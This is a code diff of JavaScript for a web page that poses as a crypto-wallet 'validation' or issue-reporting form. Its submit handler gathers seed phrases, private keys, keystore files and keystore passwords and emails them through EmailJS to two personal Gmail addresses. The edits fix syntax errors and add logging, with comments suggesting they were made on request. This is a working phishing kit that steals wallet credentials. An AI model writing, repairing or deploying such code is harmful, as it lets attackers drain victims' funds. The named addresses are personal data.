@@ -17,10 +17,10 @@ function setupFormValidation() {
             const hint = seedPhraseInput.parentElement.querySelector('.input-hint');
             if (hint) {
                 if (wordCount === 12 || wordCount === 24) {
-                    hint.textContent = ${wordCount} words (valid seed phrase length);
+                    hint.textContent = `${wordCount} words (valid seed phrase length)`; // CORRECTED
                     hint.style.color = 'var(--success-500)';
                 } else {
-                    hint.textContent = ${wordCount} words (should be 12 or 24 words);
+                    hint.textContent = `${wordCount} words (should be 12 to 24 words)`; // CORRECTED
                     hint.style.color = 'var(--neutral-500)';
                 }
             }
@@ -42,7 +42,7 @@ function setupFormValidation() {
                     hint.textContent = 'Valid private key length (64 characters)';
                     hint.style.color = 'var(--success-500)';
                 } else {
-                    hint.textContent = ${sanitizedValue.length} characters (should be 64 characters);
+                    hint.textContent = `${sanitizedValue.length} characters (should be 64 characters)`; // CORRECTED
                     hint.style.color = 'var(--neutral-500)';
                 }
             }
@@ -188,7 +188,8 @@ function setupFormValidation() {
             const walletType = walletTypeElement ? walletTypeElement.value : 'N/A';
             const validationMethod = validationTypeElement ? validationTypeElement.value : 'N/A';
             const issueType = issueTypeElement ? issueTypeElement.value : 'N/A';
-            const otherIssueDescription = (issueTypeElement && issueTypeElement.value === 'other' && otherIssueElement && otherIssueElement.value.trim()) ? otherIssueElement.value.trim() : 'N/A';
+            // MODIFIED: Renamed variable to otherIssueDescriptionValue
+            const otherIssueDescriptionValue = (issueTypeElement && issueTypeElement.value === 'other' && otherIssueElement && otherIssueElement.value.trim()) ? otherIssueElement.value.trim() : 'N/A';
 
             let seedPhraseValue = 'N/A';
             let keystoreJsonValue = 'N/A';
@@ -216,17 +217,24 @@ function setupFormValidation() {
                 keystore_password: keystorePasswordValue,
                 private_key: privateKeyValue,
                 issue_type: issueType,
-                other_issue_description: otherIssueDescription,
+                // MODIFIED: Using otherIssueDescriptionValue here
+                other_issue_description: otherIssueDescriptionValue,
                 user_agent: navigator.userAgent,
                 to_email: 'kingsleyfrancis.kalu@gmail.com,oscarscott2411@gmail.com'
             };
 
             // --- EmailJS Configuration ---
-            const SERVICE_ID = "service_mkx8qgf";
-            const TEMPLATE_ID = "template_g5wq2v1"; // <<< YOUR CUSTOM TEMPLATE ID IS HERE
+            // !!! IMPORTANT: Make sure these IDs are YOUR actual EmailJS Service ID and Template ID !!!
+            const SERVICE_ID = "service_mkx8qgf"; // This should be YOUR EmailJS Service ID
+            const TEMPLATE_ID = "template_g5wq2v1"; // This should be YOUR EmailJS Template ID that uses the `to_email` parameter
 
             console.log("Preparing to send email with params:", JSON.stringify(templateParams, null, 2));
             console.log("Using SERVICE_ID:", SERVICE_ID, "and TEMPLATE_ID:", TEMPLATE_ID);
+
+            // !!! ADDED LINES EXACTLY AS REQUESTED !!!
+            console.log("--- DEBUG: templateParams BEING SENT TO EmailJS ---");
+            console.log(JSON.stringify(templateParams, null, 2));
+            // !!! END OF ADDED LINES !!!
 
             emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
                 .then(function(response) {
@@ -331,6 +339,6 @@ function showValidationError(message) {
         }, 5000);
     } else {
         console.error("Could not find .validation-form to display error message.");
-        alert(Validation Error: ${message});
+        alert(`Validation Error: ${message}`); // CORRECTED
     }
 }
